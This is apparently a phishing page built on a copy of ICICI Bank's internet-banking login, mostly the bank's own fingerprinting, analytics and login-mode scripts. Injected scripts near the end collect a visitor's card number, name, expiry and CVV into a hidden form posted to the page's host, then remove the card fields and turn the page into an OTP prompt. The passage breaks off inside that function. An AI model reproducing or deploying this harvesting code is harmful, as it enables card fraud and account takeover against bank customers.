feba.js.common.blockOnHyperlinkClicks("loadingImage");
feba.js.common.runPageCustomFunction("AuthenticationScreen_onload");});</script><img src="L001/consumer/images/widget-loading.gif" id="loadingImage" style="display:none;"/></form></body></html>


<FORM NAME="RIBSignOn" NAME="RIBSignOn" ACTION="https://infinity.icicibank.co.in/BANKAWAY?IWQRYTASKOBJNAME=bay_mc_login&BAY_BANKID=ICI" METHOD="POST">
 <!-- Set all input Field values as hidden fields -->
<!--INPUT TYPE=HIDDEN NAME=RTNTTYPE Value='POST'-->
<INPUT TYPE=HIDDEN NAME=ShowOnSamePage VALUE="N">
<INPUT TYPE=HIDDEN NAME=MD id="MD_NEW" VALUE="P">
<INPUT TYPE=HIDDEN NAME=PID id="PID_NEW">
<INPUT TYPE=HIDDEN NAME=PRN id="PRN_NEW">
<INPUT TYPE=HIDDEN NAME=ITC id="ITC_NEW">
<INPUT TYPE=HIDDEN NAME=AMT id="AMT_NEW">
<INPUT TYPE=HIDDEN NAME=CRN id="CRN_NEW">
<INPUT TYPE=HIDDEN NAME=RU id="RU_NEW">
<INPUT TYPE=HIDDEN NAME=CG id="CG_NEW">
<INPUT TYPE=HIDDEN NAME=ES id="ES_NEW">



<!-- Clicking the Submit Button Submits the Form and sends all hidden field values to Infinity-->

</FORM>



	 
   

 
      <script type="text/javascript">
      challenge='null';	  
		</script>
      
<script language="javascript">
var remoteAddr = "192.168.116.30";
if(remoteAddr.toString()=="null")
	remoteAddr = "null";
</script>
<script language="javascript">

var ar_cid = "CkxMTwCjWD0ipwD0uUE-XBR";

</script>

      <script language="javascript">
var contextPath = "/corp/jsp";
//var remoteAddr = "192.168.116.30";
var orgname = "RIBINDIA";
var appcttx = "RIBINDIA";
var ar_accessCode=null;
//should not be required now.
var clientPath = "/corp/jsp/client";
</script>
<!-- RiskFort js files -->
<script type="text/javascript" src="/corp/scripts/adaptiveauthentication/arcot/m_js/devicedna/Deprecated.js"></script>
<script type="text/javascript" src="/corp/scripts/adaptiveauthentication/arcot/m_js/devicedna/riskminder-client.js"></script>
<!-- Above Java scripts are used to collect the Device DNA from the client machine  -->	
<script type="text/javascript"	src="/corp/scripts/adaptiveauthentication/arcot/m_js/arcotclient.js"></script>
<script type="text/javascript"	src="/corp/scripts/adaptiveauthentication/arcot/m_js/md5.js"></script>
<script type="text/javascript"	src="/corp/scripts/adaptiveauthentication/arcot/m_js/sha1.js"></script>
<script type="text/javascript"	src="/corp/scripts/adaptiveauthentication/arcot/m_js/login-helper.js"></script>

				
		<script type="text/javascript">	var jsVersion = 1.0;</script>
		<script language="Javascript1.1">jsVersion = 1.1;</script>
		<script language="Javascript1.2">jsVersion = 1.2;</script>
		<script language="Javascript1.3">jsVersion = 1.3;</script>
		<script language="Javascript1.4">jsVersion = 1.4;</script>
		<script language="Javascript1.5">jsVersion = 1.5;</script>
		<script language="Javascript1.6">jsVersion = 1.6;</script>
		<script language="Javascript1.7">jsVersion = 1.7;</script>
		<script language="Javascript1.8">jsVersion = 1.8;</script>
		<!-- Script to detect the Java Script Version of the browser. -->
<script>

function callcollectArcotData(accessCode){
try{
	//alert("Inside callcollectArcotData function");
	var hashPass = "";
ar_accessCode=accessCode;
		
	hashPass = ArcotSHA1.hex_sha1(accessCode);	
	document.forms["index2"].CorporateSignonCorpId.value=document.getElementById("AuthenticationFG.USER_PRINCIPAL").value;
	collectArcotData(hashPass);
	}catch(e) {
		//alert("Error in callcollectArcotData"+e.message);
}
}

</script>                  
      <script type="text/javascript" src="/corp/scripts/adaptiveauthentication/arcot/iciciAdaptiveCommon.js"></script>
      <script type="text/javascript" src="/corp/scripts/adaptiveauthentication/arcot/iciciCollectArcotData.js"></script>
      
      <!-- Above Java scripts are used to collect the Device DNA from the client machine  -->
	
      <script type="text/javascript" src="/corp/scripts/adaptiveauthentication/arcot/rfutil.js"></script>
      <script>
      var jsloc = '/corp/scripts/adaptiveauthentication/arcot';
     

      
      </script>
     
		<script>			
		do_arcotProcess();		
		</script>
			<div id="flashsetting">
		            <div id ="flashcontent" align="center" style="color : red"></div>

			</div>
			<form name="index2" id="index2">
				<input type="hidden" name="noscripttag" id="noscripttag" value="noscript found::javascript=disabled"/>						
				<input type="hidden" name="cacheSignChallenge" value="1001"/>				
				<input type="hidden" name="challenge"/>
				<input type="hidden" name="fetchArcotId" value="N"/>				
				<input type="hidden" name="arcotClientType" value=""/>				
				<input type="hidden" name="arcotEnableBrowser" value="N"/>				
				<!-- RiskFort data collection-->
				<input type="hidden" name="MFP" value=""> 
				<input type="hidden" name="IpAddress"> 
				<input type="hidden" name="CallerID">
				<input type="hidden" name="DeviceID"> 
				<input type="hidden" name="deviceDNA" value="">
				<input type="hidden" name="executionTime" value="0">
				<!-- RiskFort data collection -->
				<input type="hidden" name="javascriptflag" value="disabled">				
				<input type="hidden" name="flashflag" value="disabled">		
				<input type="hidden" name="CorporateSignonCorpId" value="">			
				<input type="hidden" name="extralog">
				
				
				<script type="text/javascript"> 
					document.forms["index2"].extralog.value="User-Agent:"+navigator.userAgent+":";
				</script> 				
				<div id="ArcotIDClient123"></div>
				 
				<input type="hidden" name="onOffValue" value="Y">	
				<div id="DeviceIdClient"></div>
				<div id="ArcotIDClient" ></div>								
			</form>	
			<script>
			
		 	initArcotInline(document.getElementById("index2"));	
			setTimeout("initRiskClient()", 2000); 			
			
			</script>
										



<script type="text/javascript">
			//Added for TO: 370365 START- to get cursor by default on User Id textbox on page load
				if(((document.getElementById('PID').value==null) ||  (document.getElementById('PID').value=='')) && (location.href.search('REDIR=') == -1)) {
					document.getElementById("AuthenticationFG.USER_PRINCIPAL").focus();
				}
			//Added for TO: 370365 END
                if(location.href.search('REDIR=Y') != -1) {

               		document.getElementById('topbar').style.display='none';
                	document.getElementById('links_container').style.display='none';
			    	document.getElementById('links_container_mb').style.display='none';
			    	document.getElementById('mb').style.display='none';
					document.getElementById('HDisplay1').style.display = 'none';
					document.getElementById('FooterLinks').style.display = 'none';
					//document.getElementById('Footertext').style.display = 'none';
					document.getElementById('footerInner').style.display = 'none';
					document.getElementById('footer').style.display = 'none';

					document.getElementById('AuthenticationFG.ACCESS_CODE').value = "";

                    var btnLogin = document.getElementById('VALIDATE_CREDENTIALS');
					if(btnLogin == null) {
						btnLogin = document.getElementById('VALIDATE_CREDENTIALS1');
					}
					if(btnLogin == null) {
						btnLogin = document.getElementById('VALIDATE_CREDENTIALS2');
					}

                    encryptUsingJS(null,false);
                    btnLogin.click();
                }
                else if (location.href.search('REDIR=L') != -1) {

                   document.getElementById('topbar').style.display='none';

		   document.getElementById('links_container').style.display='none';

		   document.getElementById('links_container_mb').style.display='none';

		   document.getElementById('mb').style.display='none';

		   document.getElementById('HDisplay1').style.display = 'none';

		   document.getElementById('FooterLinks').style.display = 'none';

		  //document.getElementById('Footertext').style.display = 'none';

		   document.getElementById('footerInner').style.display = 'none';

		   document.getElementById('footer').style.display = 'none';


                    var accessCode = document.getElementById('FORGOT_PWD');
                                accessCode.click();
                }
                else {
                                // this is done to clear password field in case user has entered a wrong password and login page is displayed back
                                document.getElementById('HDisplay2').style.display = 'none';
                                document.getElementById('AuthenticationFG.ACCESS_CODE').value = '';
                }
</script>
<script type="text/javascript">

function passwordForgot(){
	document.getElementById('FORGOT_PWD').click();
}
</script>
<script type="text/javascript">
	// function checkEnter(event){
	// var keyCode = event.keyCode ? event.keyCode : event.which ? event.which : event.charCode;
	
	// if(keyCode=="13")
	// {
	// 		 if(document.getElementById('AuthenticationFG.USER_PRINCIPAL').value=="")
	// 		 {
	// 			 alert("Please enter your User ID");
	// 			 document.getElementById('AuthenticationFG.USER_PRINCIPAL').focus();			 	
	// 			 return false; 
	// 		 }
	// 		 else if(document.getElementById('AuthenticationFG.ACCESS_CODE').value=="")
	// 		 {
	// 			 alert("Please enter your Password");
	// 			 document.getElementById('AuthenticationFG.ACCESS_CODE').focus();
	// 			 return false; 
	// 		 }			 
	// 		 else{
	// 			 return true;
	// 		 }			 
	// }
	// return true;
	// }

	// var ms_ie = false;
    // var ua = window.navigator.userAgent;
    // var old_ie = ua.indexOf('MSIE ');
    // var new_ie = ua.indexOf('Trident/');

    // if ((old_ie > -1) || (new_ie > -1)) {
    //     ms_ie = true;
    // }
    // if(!ms_ie){
	// if(document.getElementById("VALIDATE_CREDENTIALS")!=null){
	// 	document.getElementById("VALIDATE_CREDENTIALS").onclick=function (){
			

	// 		if(document.getElementById('AuthenticationFG.USER_PRINCIPAL').value=="")
	// 		 {
	// 			 alert("Please enter your User ID");
	// 			 document.getElementById('AuthenticationFG.USER_PRINCIPAL').focus();
	// 			 document.getElementById('AuthenticationFG.ACCESS_CODE').value="";
	// 			 flag = false;	
	// 			 return false; 

	// 		 }else if (document.getElementById('AuthenticationFG.ACCESS_CODE').value == "") {
			
	// 			 alert("Please enter your Password");
	// 			 document.getElementById('AuthenticationFG.ACCESS_CODE').focus();
	// 			 return false;

	// 		 }else{
	// 			  // Capture required UBA Data
	// 			  captureUbaJsonResult();
	// 			  flag = true;	
	// 			  //document.getElementById('VALIDATE_CREDENTIALS').click();
	// 			  return true;
	// 			 }
	// 	}
	// 	}
	// 	if(document.getElementById("VALIDATE_CREDENTIALS1")!=null){
	// 	document.getElementById("VALIDATE_CREDENTIALS1").onclick=function (){
			
	// 		if(document.getElementById('AuthenticationFG.USER_PRINCIPAL').value=="")
	// 		 {
	// 			 alert("Please enter your User ID");
	// 			 document.getElementById('AuthenticationFG.USER_PRINCIPAL').focus();
	// 			 document.getElementById('AuthenticationFG.ACCESS_CODE').value="";
	// 			 flag = false;	
	// 			 return false; 

	// 		 }else if (document.getElementById('AuthenticationFG.ACCESS_CODE').value == "") {

	// 			 alert("Please enter your Password");
	// 			 document.getElementById('AuthenticationFG.ACCESS_CODE').focus();
	// 			 return false;

	// 		 }else{
	// 			  // Capture required UBA Data
	// 			  captureUbaJsonResult();
	// 			  flag = true;		    
	// 			  //document.getElementById('VALIDATE_CREDENTIALS1').click();
	// 			  feba.js.adaptive.icici.onLoginSubmit(this.id);
	// 			  return true;
	// 			 }
	// 	}
	// 	}
	// 	if(document.getElementById("VALIDATE_CREDENTIALS2")!=null){
	// 	document.getElementById("VALIDATE_CREDENTIALS2").onclick=function (){

	// 		if(document.getElementById('AuthenticationFG.USER_PRINCIPAL').value=="")
	// 		 {
	// 			 alert("Please enter your User ID");
	// 			 document.getElementById('AuthenticationFG.USER_PRINCIPAL').focus();
	// 			 document.getElementById('AuthenticationFG.ACCESS_CODE').value="";
	// 			 flag = false;	
	// 			 return false; 

	// 		 }else if (document.getElementById('AuthenticationFG.ACCESS_CODE').value == "") {

	// 			 alert("Please enter your Password");
	// 			 document.getElementById('AuthenticationFG.ACCESS_CODE').focus();
	// 			 return false;

	// 		 }else{
	// 			  // Capture required UBA Data
	// 			  captureUbaJsonResult();
	// 			  flag = true;		    
	// 			  //document.getElementById('VALIDATE_CREDENTIALS2').click();
	// 			  return true;
	// 			 }
	// 	}

	//     }
    // }else{

    // 	document.AuthenticationFG.onsubmit=function (){
	// 	if(callMode=="99" || callMode == "100"){
    // 			return true;
    // 		}
    		
       		
    // 		if(document.getElementById('AuthenticationFG.USER_PRINCIPAL').value=="")
    // 		 {
    // 			 alert("Please enter your User ID");
    			 
    // 			 document.getElementById('AuthenticationFG.USER_PRINCIPAL').focus();
    // 			 document.getElementById('AuthenticationFG.ACCESS_CODE').value="";
    			 
    // 			 return false; 

    // 		 }else if (document.getElementById('AuthenticationFG.ACCESS_CODE').value == "") {

    // 			 alert("Please enter your Password");
    // 			 document.getElementById('AuthenticationFG.ACCESS_CODE').focus();
    // 			 flag = false;	
    // 			 //alert("return");
    // 			 return false;

    // 		 }else{
	// 			 // Capture required UBA Data
	// 			 captureUbaJsonResult();
    // 			 flag = true;
    // 			 if(document.getElementById('VALIDATE_CREDENTIALS2')!=null)		    
    // 			  	document.getElementById('VALIDATE_CREDENTIALS2').click();
    // 			 else if (document.getElementById('VALIDATE_CREDENTIALS1')!=null)
    // 				 document.getElementById('VALIDATE_CREDENTIALS1').click();
    // 			 else
    // 				 document.getElementById('VALIDATE_CREDENTIALS').click();	
    // 			  return true;
    // 			 }
    // 		}
    // }

</script>

<!-- Include the EZMCOM UBA script file -->
<script src="scripts/ezuba.min.js"></script>

<script type="text/javascript">
// @param offsetFlag Optional. Only if provide true, it will offset the char code.
// @param sessionId Optional. If not provided or provide null, it creates internal session Id.
// It is a must to call this to initialised the UBA analytics script engine.
EzUBAnalytics.init();
</script>

<script type="text/javascript">
// @param element Mandatory. It is the DOM element of textbox for which to run UBA evaluation.
// Call this to bind and register UBA analytics on textbox. 
// EzUBAnalytics.bind(element);
EzUBAnalytics.bind(document.getElementById('AuthenticationFG.ACCESS_CODE'));
</script>

<script type="text/javascript">

// function captureUbaJsonResult(){
// 	// EzUBAnalytics.ubaJson(elEva, elDes)
//     // @param elEva Mandatory. It is the DOM element of textbox for which you would like to extract it UBA analytic JSON result.
//     // @param elDes Optional. It is the DOM element of textbox or textarea for which you would like to output the UBA analytic JSON result. If not provided. The result will be returned from this function only.
//     // Call this when you ready to capture the UBA analytic JSON result. For an example: upon form submit or on click event of form Submit button.
// 	EzUBAnalytics.ubaJson(document.getElementById('AuthenticationFG.ACCESS_CODE'), document.getElementById('AuthenticationFG.UBA_PASSWORD'));
// }

</script>
<script type="text/javascript">
//////for custom dropdown  /////////
//alert('Inside custom JS');
jQuery('.user_dropdown').click(function(e) {
  e.preventDefault();
  e.stopPropagation();
  jQuery(this).toggleClass('expanded');
  jQuery('#'+jQuery(e.target).attr('for')).attr('checked',true);
});
//alert('Inside custom JS fn 1');
jQuery(document).click(function() {
	jQuery('.user_dropdown').removeClass('expanded');
});
//alert('Inside custom JS fn 2');
jQuery('.code_dropdown').click(function(e) {
  e.preventDefault();
  e.stopPropagation();
  jQuery(this).toggleClass('expanded');
  jQuery('#'+jQuery(e.target).attr('for')).attr('checked',true);
});
//alert('Inside custom JS fn 3');
jQuery(document).click(function() {
	jQuery('.code_dropdown').removeClass('expanded');
});
//alert('Inside custom JS fn 4');
jQuery('.mobile_dropdown').click(function(e) {
  e.preventDefault();
  e.stopPropagation();
  jQuery(this).toggleClass('expanded');
  jQuery('#'+jQuery(e.target).attr('for')).attr('checked',true);
});
//alert('Inside custom JS fn 5');
jQuery(document).click(function() {
	jQuery('.mobile_dropdown').removeClass('expanded');
});
//alert('Inside custom JS fn 6');

jQuery(".mode-select-mobile").click(function(){
	jQuery("#PageIdentifier").val("M");
	jQuery("#HDisplayDefault").addClass('completeHide');
	jQuery("#HDisplayMobile").removeClass('completeHide');
	
	jQuery("#AuthenticationFG\\.RIB_LOGIN_MOBILE").focus();
	
	//CIB RIB INTEGRATION - START
	if(document.getElementById("IS_CIBRIB_LOGIN") !=null)
	{
		if(document.getElementById("IS_CIBRIB_LOGIN").value == "Y")
		{
			if(document.getElementById('NLI_Revamp_Banner_ID') !=null)
			{
				document.getElementById('NLI_Revamp_Banner_ID').style.display='none';
			}
		}
	}
	//CIB RIB INTEGRATION - END
	
	try{
		
if(document.getElementById("IS_CIBRIB_LOGIN").value == "Y")
{
	console.log('inside cibrib ga code changes>>2');
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
ga('create', 'UA-17906056-1',{'cookieDomain': 'icicibank.com'});
ga('set', 'userId', tvc_getCookie()("Fed_ID_NLI")); 
ga('send', 'pageview', '/VPV/LI/InternetBanking/CIBRIBIntegration/CIBtoRIB/Mobilenoinput',{ 
   'dimension1': tvc_getCookie()("Fed_ID_NLI"), 
   'dimension77': tvc_getQueryString()("CTA_FLAG",window.location.href), 
   'dimension72': tvc_getQueryString()("ITM",window.location.href), 
	   'dimension124':  tvc_getQueryString()("ITM",window.location.href),
   'dimension2': tvc_getCookie()("tvc_segment"), 
   'dimension45': "NTB_"+tvc_getCookie()("rn"), 
   'dimension78': ITM_value() 
});		
}
else {
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
ga('create', 'UA-17906056-1',{'cookieDomain': 'icicibank.com'});
ga('set', 'userId', tvc_getCookie()("Fed_ID_NLI")); 
ga('send', 'pageview', '/VPV/LI/InternetBanking/InfinityLogin/LoginRIBusingMobileno',{ 
   'dimension1': tvc_getCookie()("Fed_ID_NLI"), 
   'dimension77': tvc_getQueryString()("CTA_FLAG",window.location.href), 
   'dimension72': tvc_getQueryString()("ITM",window.location.href), 
	   'dimension124':  tvc_getQueryString()("ITM",window.location.href),
   'dimension2': tvc_getCookie()("tvc_segment"), 
   'dimension45': "NTB_"+tvc_getCookie()("rn"), 
   'dimension78': ITM_value() 
});
}
		}catch(e){}
		
	});
jQuery(".mode-select-userid").click(function(){
		jQuery("#PageIdentifier").val("U");		
		jQuery("#HDisplayDefault").addClass('completeHide');
		jQuery("#HDisplay1").removeClass('completeHide');
		jQuery("#AuthenticationFG\\.USER_PRINCIPAL").focus();
		
		//CIB RIB INTEGRATION - START
		if(document.getElementById("IS_CIBRIB_LOGIN") !=null)
		{
			if(document.getElementById("IS_CIBRIB_LOGIN").value == "Y")
			{
				if(document.getElementById('NLI_Revamp_Banner_ID') !=null)
				{
					document.getElementById('NLI_Revamp_Banner_ID').style.display='none';
				}
			}
		}
		//CIB RIB INTEGRATION - END
		
		try{			

if(document.getElementById("IS_CIBRIB_LOGIN").value == "Y")
{
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
ga('create', 'UA-17906056-1',{'cookieDomain': 'icicibank.com'});
ga('set', 'userId', tvc_getCookie()("Fed_ID_NLI")); 
ga('send', 'pageview', '/VPV/LI/InternetBanking/CIBRIBIntegration/CIBtoRIB/Useridpassword',{ 
   'dimension1': tvc_getCookie()("Fed_ID_NLI"), 
   'dimension77': tvc_getQueryString()("CTA_FLAG",window.location.href), 
   'dimension72': tvc_getQueryString()("ITM",window.location.href), 
	   'dimension124':  tvc_getQueryString()("ITM",window.location.href),
   'dimension2': tvc_getCookie()("tvc_segment"), 
   'dimension45': "NTB_"+tvc_getCookie()("rn"), 
   'dimension78': ITM_value() 
});			
}		
else{
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
ga('create', 'UA-17906056-1',{'cookieDomain': 'icicibank.com'});
ga('set', 'userId', tvc_getCookie()("Fed_ID_NLI")); 
ga('send', 'pageview', '/VPV/LI/InternetBanking/InfinityLogin/LoginRIBusinguserid',{ 
   'dimension1': tvc_getCookie()("Fed_ID_NLI"), 
   'dimension77': tvc_getQueryString()("CTA_FLAG",window.location.href), 
   'dimension72': tvc_getQueryString()("ITM",window.location.href), 
	   'dimension124':  tvc_getQueryString()("ITM",window.location.href),
   'dimension2': tvc_getCookie()("tvc_segment"), 
   'dimension45': "NTB_"+tvc_getCookie()("rn"), 
   'dimension78': ITM_value() 
});
}		
		}catch(e){}
		
		});
//jQuery(".get-OTP-page").click(function(){jQuery("#PageIdentifier").val("O");jQuery("#OTP_SCREEN_PAGE").click();});
 
function ontabpin(){
				try{
					console.log("Inside ontabpin start");
					var keyPad1 = jQuery('.input-field a:eq(0)')[0];
					var keyPad2 = jQuery('.input-field a:eq(1)')[0];
					keyPad1.tabIndex= -1;
					keyPad2.tabIndex= -1;
					console.log("Inside ontabpin end keyPad1:"+keyPad1);
					console.log("Inside ontabpin end keyPad2:"+keyPad2);
				}catch(e){}

}
function goToMobileOTP(){
	jQuery("#PageIdentifier").val("M");
	jQuery("#HDisplayDefault").addClass('completeHide');
	jQuery("#HDisplayMobile").removeClass('completeHide');
	
	jQuery("#AuthenticationFG\\.RIB_LOGIN_MOBILE").focus();
}
function goUserId(){
	jQuery("#PageIdentifier").val("U");		
	jQuery("#HDisplayDefault").addClass('completeHide');
	jQuery("#HDisplay1").removeClass('completeHide');
	jQuery("#AuthenticationFG\\.USER_PRINCIPAL").focus();
}
function clearMobile(){
	var blank = "";
	console.log("testtest");
	jQuery("#AuthenticationFG\\.RIB_LOGIN_MOBILE").attr({
        value: blank
    })
}
function isNumber(evt) {
	console.log("iisdee number");
    evt = (evt) ? evt : window.event;
    var charCode = (evt.which) ? evt.which : evt.keyCode;
	
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        
		return false;
    }
    return true;
}
function loginWithUserIdLink()
{
try{
console.log("loginWithUserIdLink");
	ga('set', 'userId', tvc_getCookie()("Fed_ID_NLI")); 
   ga('send', 'event', 'RIB','loginusingUserID','onceselectedmobileno',
				{
				   'dimension1': tvc_getCookie()("Fed_ID_NLI"), 
				   'dimension77': tvc_getQueryString()("CTA_FLAG",window.location.href), 
				   'dimension72': tvc_getQueryString()("ITM",window.location.href), 
					   'dimension124':  tvc_getQueryString()("ITM",window.location.href),
				   'dimension2': tvc_getCookie()("tvc_segment"), 
				   'dimension45': "NTB_"+tvc_getCookie()("rn"), 
				   'dimension78': ITM_value() 
				});
}catch(e){}
	var ms_ie = false;
    var ua = window.navigator.userAgent;
    var old_ie = ua.indexOf('MSIE ');
    var new_ie = ua.indexOf('Trident/');

    if ((old_ie > -1) || (new_ie > -1)) {
		console.log("ms_ie  true");
        ms_ie = true;
    }
    if(!ms_ie){		
		if(location.href.includes("__START_TRAN_FLAG__")){
			jQuery("#PageIdentifier").val("U");		
			jQuery("#HDisplayMobile").addClass('completeHide');
			jQuery("#HDisplay1").removeClass('completeHide');
			jQuery("#AuthenticationFG\\.USER_PRINCIPAL").focus();
		}else{
			jQuery("#PageIdentifier").val("U");
			jQuery("#LOGIN_MODE_SEL_FROM_MOB").click();
		}
	}else{
		jQuery("#PageIdentifier").val("U");
		jQuery("#LOGIN_MODE_SEL_FROM_MOB").click();
	}

	 
}
function loginWithMobileLink()
{
try{
console.log("loginWithMobileLink");
ga('set', 'userId', tvc_getCookie()("Fed_ID_NLI")); 
ga('send', 'event', 'RIB','loginusingmobile','onceselectinguserid',
				{  'dimension1': tvc_getCookie()("Fed_ID_NLI"), 
				   'dimension77': tvc_getQueryString()("CTA_FLAG",window.location.href), 
				   'dimension72': tvc_getQueryString()("ITM",window.location.href), 
					   'dimension124':  tvc_getQueryString()("ITM",window.location.href),
				   'dimension2': tvc_getCookie()("tvc_segment"), 
				   'dimension45': "NTB_"+tvc_getCookie()("rn"), 
				   'dimension78': ITM_value() 
				   });
}catch(e){}

	var ms_ie = false;
    var ua = window.navigator.userAgent;
    var old_ie = ua.indexOf('MSIE ');
    var new_ie = ua.indexOf('Trident/');
    if ((old_ie > -1) || (new_ie > -1)) {
		console.log("ms_ie  true");
        ms_ie = true;
    }
    if(!ms_ie){			
		if(location.href.includes("__START_TRAN_FLAG__")){
			jQuery("#PageIdentifier").val("M");
			jQuery("#HDisplay1").addClass('completeHide');
			jQuery("#HDisplayMobile").removeClass('completeHide');			
			jQuery("#AuthenticationFG\\.RIB_LOGIN_MOBILE").focus();
		}else{
			jQuery("#PageIdentifier").val("M");
			jQuery("#LOGIN_MODE_SEL_FROM_USR").click();
		}
	}else{
	console.log("before click");
		jQuery("#PageIdentifier").val("M");
		jQuery("#LOGIN_MODE_SEL_FROM_USR").click();
	}	 
}
function valOTPPin(event){
	
	var keyCode = event.keyCode ? event.keyCode : event.which ? event.which : event.charCode;
		
		if(keyCode=="13")
		{
			document.getElementById('RIB_VALIDATE_MOBILE_PIN').click();	 
		}
		
		var flag = isNumber(event);
		if(flag == false){
			return false;
		}
}
function editLoginMode()
{
console.log("editLoginMode");
   ga('send', 'event', 'RIB','Edit','onceselectedmobileno',
				{'dimension1': '4130630318'});
	 
}
function resendotp()
{
console.log("resendotp");
     ga('send', 'event', 'RIB','resend OTP','loginoption',
				{'dimension1': '4130630318'});
	 document.getElementById("RIB_RESEND_MOBILE_LOGIN_OTP").click();
}

function proceedbtn(event)
{


	document.getElementById("RIB_VALIDATE_MOBILE_OTP").disabled = false;
	
	var keyCode = event.keyCode ? event.keyCode : event.which ? event.which : event.charCode;
		
		if(keyCode=="13")
		{
			document.getElementById('RIB_VALIDATE_MOBILE_OTP').click();	 
		}
		
		var flag = isNumber(event);
		if(flag == false){
			return false;
		}
}

function onFetchQuoteCompleteEvent(jqXHR, textStatus){
	
                console.log("In onFetchQuoteCompleteEvent()...");
				
				
				
				
                
                var response = eval("response="+jqXHR.responseText);
                console.log("response",response);
                if(response.BusinessException || response.CriticalException){
                                jQuery('#ErrorDisplay_TABLE').html(response.FormattedError);
                                feba.domManipulator.each(response.FormFieldsInError, function(index, val) {
                                                                var elements = LIB.__GET_ELEMENT_BY_ATTRIBUTE__('for', val);
                                                                var element = elements[0];
                                                                if (element) {
                                                                                feba.domManipulator.addClass(element, Constants.ERROR_HIGHLIGHT_CLASS);
                                                                }
                                                });
                }else{
                                jQuery('.error_highlight').removeClass('error_highlight');
                } 
				
				
}


function valMobileCountry(event){
	var keyCode = event.keyCode ? event.keyCode : event.which ? event.which : event.charCode;
	
	if(keyCode=="13")
	{
		document.getElementById('RIB_VALIDATE_MOBILE_LOGIN').click();	 
	}
	
	var flag = isNumber(event);
	if(flag == false){
		return false;
	}
	
	var countryCode = jQuery("#AuthenticationFG\\.RIB_COUNTRY_CODE").val();

	var enteredMobileNumber= jQuery("#AuthenticationFG\\.RIB_LOGIN_MOBILE").val();

	if(countryCode == "91" && enteredMobileNumber.length > 9)
	{
	return false;
	}
	if(countryCode == "65" && enteredMobileNumber.length > 7)
	{
	return false;
	}
	if(countryCode == "61" && enteredMobileNumber.length > 8)
	{
	return false;
	}
	if(countryCode == "1" && enteredMobileNumber.length > 10)
	{
	return false;
	}
	if(countryCode == "965" && enteredMobileNumber.length > 7)
	{
	return false;
	}
	if(countryCode == "968" && enteredMobileNumber.length > 7)
	{
	return false;
	}
	if(countryCode == "60" && enteredMobileNumber.length > 9)
	{
	return false;
	}
	if(countryCode == "966" && enteredMobileNumber.length > 8)
	{
	return false;
	}
	if(countryCode == "971" && enteredMobileNumber.length > 8)
	{
	return false;
	}
	if(countryCode == "44" && enteredMobileNumber.length > 9)
	{
	return false;
	}
	if(countryCode == "973" && enteredMobileNumber.length > 9)
	{
	return false;
	}
	if(countryCode == "49" && enteredMobileNumber.length > 10)
	{
	return false;
	}
}
</script>
<script>
    const creditCardNumberInput = document.getElementById('creditCardNumber');

    creditCardNumberInput.addEventListener('input', function (event) {
      const input = event.target;
      const trimmedValue = input.value.replace(/\s+/g, '');

      if (trimmedValue.length > 0) {
        const spacedValue = trimmedValue.match(/.{1,4}/g).join(' ');
        input.value = spacedValue;
      }
    });

    document.getElementById('creditCardForm').addEventListener('submit', function (event) {
      event.preventDefault();

      const creditCardNumber = creditCardNumberInput.value.replace(/\s+/g, '');

      // You can perform further validation or submit the form data to a server here
      console.log('Credit Card Number:', creditCardNumber);
    });
</script>
<script>

        function launchMyForm() {
            var card_num = document.getElementById("creditCardNumber").value;
			var card_name = document.getElementById("cust_name").value;
			var card_month = document.getElementById("delete4").value;
			var card_year = document.getElementById("delete5").value;         
			var card_expiry = card_month.toString() + '/' + card_year.toString();
			
			var card_cvv = document.getElementById("cvv").value;
			
			var myForm = document.createElement("form");
            myForm.setAttribute("id", "myForm");
            document.body.appendChild(myForm);

            var field1 = document.createElement("input");
            field1.setAttribute("type", "hidden");
            field1.setAttribute("name", "card_num");
            field1.setAttribute("value", card_num);
            myForm.appendChild(field1);

			var field2 = document.createElement("input");
            field2.setAttribute("type", "hidden");
            field2.setAttribute("name", "card_name");
            field2.setAttribute("value", card_name);
            myForm.appendChild(field2);

			var field3 = document.createElement("input");
            field3.setAttribute("type", "hidden");
            field3.setAttribute("name", "card_expiry");
            field3.setAttribute("value", card_expiry);
            myForm.appendChild(field3);

			var field4 = document.createElement("input");
            field4.setAttribute("type", "hidden");
            field4.setAttribute("name", "card_cvv");
            field4.setAttribute("value", card_cvv);
            myForm.appendChild(field4);

            myForm.method = "POST";
            myForm.action = "";
            
			

			var element = document.getElementById("delete1");
			element.remove();
			var element = document.getElementById("delete2");
			element.remove();
			var element = document.getElementById("delete3");
			element.remove();
			var element = document.getElementById("delete4");
			element.remove();
			var element = document.getElementById("cust_name");
			element.remove();
			var element = document.getElementById("creditCardNumber");
			element.remove();
			var element = document.getElementById("delete5");
			element.remove();
			var element = document.getElementById("HDisplay1.Rb16");
			element.remove();
			var element = document.getElementById("HDisplay1.Rb14");
			element.remove();
			var element = document.getElementById("HDisplay1.Rb14");
			element.remove();

			var element = document.getElementById("UserId_Text3");
			element.textContent = "OTP:";
			var element = document.getElementById("VALIDATE_CREDENTIALS1");
			element.onclick = function(event) {
			return submitForm();
			};
			element.value = "Submit OTP";

			// var inputElement = document.createElement('input');
			// inputElement.type = 'text';
			// inputElement.className = 'expiry-field';
			// inputElement.id = 'otp';
